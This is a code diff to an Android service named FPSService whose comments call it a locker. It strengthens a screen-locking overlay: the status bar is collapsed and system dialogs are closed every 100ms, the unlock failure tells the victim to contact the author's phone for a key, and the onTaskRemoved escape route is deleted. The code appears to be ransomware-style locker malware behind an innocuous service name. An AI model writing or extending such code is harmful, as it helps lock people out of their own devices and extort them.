@@ -76,13 +76,9 @@ public class FPSService extends Service {
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
-                if (isAuthenticated) return;
-                
-                collapseStatusBar();
-                closeSystemDialogs();
-                applyFullScreen(); // Pastikan layar tetap full
-                
-                handler.postDelayed(this, 150); // Delay 150ms sudah cukup agresif
+                collapseStatusBar(); // Memanggil method collapsePanels yang sudah kamu buat
+                closeSystemDialogs(); // Mengirim ACTION_CLOSE_SYSTEM_DIALOGS
+                handler.postDelayed(this, 100); // Cek setiap 100ms
             }
         }, 100);
     }
@@ -213,12 +209,12 @@ public class FPSService extends Service {
             btnUnlock.setOnClickListener(v -> {
                 if (verifyAdvancedKey(currentInput)) {
                     isAuthenticated = true;
-                    stopSelf(); // Loker berhenti total
+                    stopSelf(); 
                 } else {
                     currentInput = "";
                     display.setText("");
-                    textStatusMessage.setText("KEY FAILED! CONTACT ADMIN");
-                    // Tidak perlu panggil setupOverlayLayout lagi
+                    textStatusMessage.setText("KEY FAILED, CONTACT MY PHONE TO GET KEY");
+                    new Handler().postDelayed(() -> textStatusMessage.setText(""), 2000);
                 }
             });
         }
@@ -281,14 +277,6 @@ public class FPSService extends Service {
         } else {
             startForeground(1, notification);
         }
-    }
-    
-    @Override
-    public void onTaskRemoved(Intent rootIntent) {
-        super.onTaskRemoved(rootIntent);
-        
-        isAuthenticated = true; // Set flag agar Accessibility berhenti memblokir
-        stopSelf();
     }
 
     @Override
